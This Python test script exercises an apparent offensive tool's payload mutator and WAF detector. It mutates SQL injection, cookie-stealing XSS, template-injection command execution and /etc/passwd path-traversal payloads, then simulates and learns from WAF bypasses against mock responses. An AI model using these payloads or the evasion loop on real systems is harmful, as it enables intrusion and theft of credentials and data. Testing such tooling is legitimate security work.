"""
Payload Mutator E2E test: WAF detection + mutation strategies + bypass simulation.
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from core.mutator import WAFDetector, PayloadMutator

DIVIDER = "=" * 65
THIN = "-" * 65


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 1: Mutation Strategy Showcase
# ═══════════════════════════════════════════════════════════════════════════

print(f"\n{DIVIDER}")
print("  PHASE 1: Mutation Strategy Showcase")
print(DIVIDER)

mutator = PayloadMutator()

# SQLi payload
sqli_payload = "' UNION SELECT username,password FROM users--"
print(f"\n  Original SQL: {sqli_payload}")
print(THIN)

variants = mutator.mutate(sqli_payload, max_variants=10, context="sql")
for i, v in enumerate(variants, 1):
    print(f"  [{i:2d}] {v}")

# XSS payload
xss_payload = '<script>alert(document.cookie)</script>'
print(f"\n  Original XSS: {xss_payload}")
print(THIN)

variants = mutator.mutate(xss_payload, max_variants=8, context="xss")
for i, v in enumerate(variants, 1):
    print(f"  [{i:2d}] {v}")

# SSTI payload
ssti_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
print(f"\n  Original SSTI: {ssti_payload}")
print(THIN)

variants = mutator.mutate(ssti_payload, max_variants=6, context="ssti")
for i, v in enumerate(variants, 1):
    print(f"  [{i:2d}] {v}")

# LFI payload
lfi_payload = "../../../etc/passwd"
print(f"\n  Original LFI: {lfi_payload}")
print(THIN)

variants = mutator.mutate(lfi_payload, max_variants=6, context="lfi")
for i, v in enumerate(variants, 1):
    print(f"  [{i:2d}] {v}")


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 2: WAF Detector Tests
# ═══════════════════════════════════════════════════════════════════════════

print(f"\n\n{DIVIDER}")
print("  PHASE 2: WAF Detection Tests")
print(DIVIDER)

detector = WAFDetector()

# Mock response class
class MockResponse:
    def __init__(self, status_code=200, text="", headers=None):
        self.status_code = status_code
        self.text = text
        self.headers = headers or {}

# Test cases
cases = [
    ("Normal 200",       MockResponse(200, "<html>OK</html>"),                          False),
    ("403 Short body",   MockResponse(403, "Forbidden"),                                True),
    ("403 + WAF body",   MockResponse(403, "Request blocked by Web Application Firewall"), True),
    ("200 + WAF body",   MockResponse(200, "Your request has been blocked"),             True),
    ("Cloudflare",       MockResponse(200, "OK", {"cf-ray": "abc123"}),                 True),
    ("ModSecurity",      MockResponse(200, "OK", {"server": "Apache/2.4.41 ModSecurity"}), True),
    ("Normal 404",       MockResponse(404, "Not Found"),                                False),
    ("429 Rate limit",   MockResponse(429, "Too many requests"),                        True),
    ("200 Captcha",      MockResponse(200, "Please verify you are human"),              True),
]

for name, resp, expected in cases:
    is_blocked, reason = detector.is_waf_response(resp)
    status = "✅" if is_blocked == expected else "❌ WRONG"
    reason_str = f" ({reason})" if reason else ""
    print(f"  {status} {name:25s} -> blocked={is_blocked}{reason_str}")


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 3: Full WAF Bypass Simulation
# ═══════════════════════════════════════════════════════════════════════════

print(f"\n\n{DIVIDER}")
print("  PHASE 3: WAF Bypass Simulation")
print(DIVIDER)

# Simulate a WAF that blocks payloads containing "UNION" or "SELECT"
# but can be bypassed by comment insertion or case alternation

call_count = 0
bypass_strategy = None

def simulated_waf_send(payload):
    """Simulates a WAF: blocks UNION/SELECT keywords, passes mutations."""
    global call_count, bypass_strategy
    call_count += 1

    payload_upper = payload.upper()

    # WAF rule: block if "UNION" and "SELECT" appear as whole words
    has_union = "UNION" in payload_upper and "/**/" not in payload
    has_select = "SELECT" in payload_upper and "/**/" not in payload

    # Also block if not case-alternated (all same case)
    is_normal_case = ("UNION" in payload or "union" in payload)

    if has_union and has_select and is_normal_case:
        return MockResponse(403, "Request blocked by firewall")
    else:
        if call_count > 1:  # First call was the original (blocked)
            bypass_strategy = payload
        return MockResponse(200, f"<html><table>admin|FLAG{{waf_bypassed_with_mutation}}</table></html>")


# Create BaseExploit instance mock to test _send_with_waf_retry
from modules.base import BaseExploit

class MockSession:
    def request(self, *a, **kw): pass

class MockFlagHunter:
    def search(self, text): return []

exploit = BaseExploit(MockSession(), MockFlagHunter(), {"waf_retry_limit": 5})

original_payload = "' UNION SELECT username,password FROM users--"
print(f"\n  Original:   {original_payload}")
print(f"  WAF Rule:   Block 'UNION SELECT' unless obfuscated\n")

resp, used_payload, was_mutated = exploit._send_with_waf_retry(
    send_fn=simulated_waf_send,
    payload=original_payload,
    context="sql",
    target_url="http://waf-target.local",
)

print(f"  Result:")
print(f"    Status:      {resp.status_code}")
print(f"    Mutated:     {was_mutated}")
print(f"    Used:        {used_payload[:80]}...")
print(f"    Calls:       {call_count} (1 original + {call_count-1} mutations)")
print(f"    WAF Stats:   {exploit.waf_stats}")

if was_mutated:
    strategy = exploit._guess_strategy(original_payload, used_payload)
    print(f"    Strategy:    {strategy}")
    print(f"\n  ✅ WAF BYPASSED! Mutation worked!")
else:
    print(f"\n  ❌ WAF not bypassed (unexpected)")

# Verify strategy tracking
print(f"\n  Strategy tracking:")
print(f"    Successful strategies for waf-target.local: {exploit._mutator._successful_strategies}")


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 4: Strategy Learning (successful strategies prioritized)
# ═══════════════════════════════════════════════════════════════════════════

print(f"\n\n{DIVIDER}")
print("  PHASE 4: Strategy Learning")
print(DIVIDER)

# Reset and try again — the successful strategy should be tried first
call_count = 0
exploit2 = BaseExploit(MockSession(), MockFlagHunter(), {"waf_retry_limit": 5})

# Manually record that comment_insert worked before
exploit2._mutator.record_success("http://waf-target.local", "comment_insert")

# The mutator should now try comment_insert first
ordered = exploit2._mutator._get_ordered_strategies("sql", "http://waf-target.local")
strategy_names = [fn.__name__ for fn in ordered]
print(f"\n  Strategy order (after learning):")
for i, name in enumerate(strategy_names, 1):
    marker = " << PRIORITIZED" if i == 1 and name == "_comment_insert" else ""
    print(f"    {i}. {name}{marker}")

# Show that comment_insert moved to front
assert strategy_names[0] == "_comment_insert", f"Expected comment_insert first, got {strategy_names[0]}"
print(f"\n  ✅ Learned strategy correctly prioritized!")


print(f"\n\n{DIVIDER}")
print("  ALL TESTS PASSED!")
print(f"{DIVIDER}\n")
